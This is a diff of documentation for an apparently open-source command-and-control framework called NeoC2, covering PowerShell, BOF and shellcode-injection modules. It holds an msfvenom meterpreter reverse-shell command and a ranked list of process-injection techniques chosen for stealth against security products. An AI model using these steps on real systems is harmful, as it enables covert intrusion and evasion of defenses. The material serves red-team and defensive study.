@@ -91,7 +91,7 @@ This `pwsh` module helps operators run their own extendible powershell scripts o
 
 ```
 modules info pwsh
-pwsh <script_path> [agent_id=<agent_id>] [arguments=<script_arguments>]
+pwsh <powershell_filename> [agent_id=<agent_id>] [arguments=<script_arguments>]
 # Examples:
 pwsh my_script.ps1
 pwsh my_script.ps1 agent_id=abc123-4567-8901-2345-67890abcdef1
@@ -119,7 +119,7 @@ Execute BOFs using the execute-bof command:
 ```
 modules info execute-bof
 # In interactive mode, the agent ID is automatically inferred:
-execute-bof <bof_filename> [arguments]
+execute-bof <bof_filename> [arguments] [agent_id=<agent_id>]
 # Examples:
 execute-bof whoami.x64.o
 execute-bof whoami.x64.o -h
@@ -162,16 +162,16 @@ execute-assembly SharpHound.exe agent_id=abc123-4567-8901-2345-67890abcdef1
 
 ## PInject
 
-This module interfaces with an active agent for In-memory shellcode injection into a sacrificial process using CreateRemoteThread
+This module interfaces with an active agent for In-memory shellcode injection into a sacrificial processes with NtQueueApcThread, NtCreateThreadEx, RtlCreateUserThread, CreateRemoteThread, by their order of stealthiness
 
 #### Compatibility
 - Go_agent
 - Windows x64
 
 #### Usage
-1. Generate compatible shellcode using msfvenom
-2. Run the module and send shellcode as a base64 encoded string or a .b64 file
-3. The agent will in-memory inject the shellcode into either notepad.exe or explorer.exe
+1. Generate compatible shellcode (e.g. msfvenom)
+2. Convert the generated shelllcode to base64 string and save in a .b64 file
+3. Run the module using the .b64 file as input (shellcode_file)
 
 #### msfvenom Command Syntax
 Generate shellcode with proper null byte avoidance and correct format:
@@ -181,27 +181,49 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f ra
 
 # Base64 encode the raw shellcode and save to .b64 file before sending to the module - (preferred METHOD 1)
 base64 -w 0 shellcode.bin > shellcode.b64 
-pinject shellcode.b64
-
-# Base64 encode the raw shellcode before sending to the module - METHOD 2
-base64 -w 0 shellcode.bin
-pinject <base64_shellcode>
-# Example:
-pinject 123ABCD==
+NeoC2 (user@remote) > interact <agent_id>
+NeoC2 (user@remote)[INTERACTIVE] > pinject shellcode.b64
 ```
 
 #### Notes
-- If notepad.exe is not running on the target system, the agent will fallback on explorer.exe
-- The shellcode must be in raw binary format (use `-f raw`)
 
-#### Shellcode Injection Flow
-1. Find target process PID
-2. Open process with appropriate permissions
-3. Allocate memory in target process
-4. Write shellcode to allocated memory
-5. Change memory protection to executable
-6. Create remote thread to execute shellcode
-7. All operations performed in-memory without touching disk
+The shellcode injection techniques are ordered by stealthiness:
+
+- NtQueueApcThread (most stealthy) - Injects into existing threads
+- NtCreateThreadEx (more stealthy) - Uses native API, less monitored
+- RtlCreateUserThread (moderate stealth) - Older API, less common
+- CreateRemoteThread (least stealthy, but most stable) - Classic method, widely monitored
+
+#### Shellcode Injection Flow:
+1. The agent will enumerate the suitable process (dllhost.exe, taskhost.exe, conhost.exe, notepad.exe explorer.exe)
+2. The agent opens a handle to the target process 
+3. The agent attempts several injection techniques:
+
+##### Technique 1: NtQueueApcThread (Most Stealthy)
+- Allocates executable memory in the target process
+- Enumerates threads in the target process using CreateToolhelp32Snapshot and Thread32First/Next
+- Finds a suitable thread in the target process
+- Queues an Asynchronous Procedure Call (APC) to the target thread using NtQueueApcThread
+- When the target thread enters an alertable state, the shellcode executes in that thread's context
+
+##### Technique 2: NtCreateThreadEx
+- Allocates executable memory in the target process
+- Writes the shellcode to memory
+- Creates a new thread directly in the target process using the native NtCreateThreadEx API,
+
+##### Technique 3: RtlCreateUserThread
+- Allocates executable memory in the target process
+- Writes the shellcode to memory
+- Creates a thread using the RtlCreateUserThread API (older Windows API)
+
+##### Technique 4: Classic CreateRemoteThread
+- Allocates memory in the target process using VirtualAllocEx
+- Writes the shellcode to the allocated memory using WriteProcessMemory
+- Changes memory protection to executable using VirtualProtectEx
+- Creates a remote thread to execute the shellcode using CreateRemoteThread
+
+4. Once successful injection occurs, the shellcode runs in the target process, and the agent reports success back to the C2 server. The agent properly closes handles and cleans up resources.
+5. The multiple technique approach ensures the agent can adapt to different security configurations and increases the likelihood of successful injection when some techniques are blocked by security products.
 
 #### Supported Payloads
 - windows/x64/meterpreter/reverse_tcp
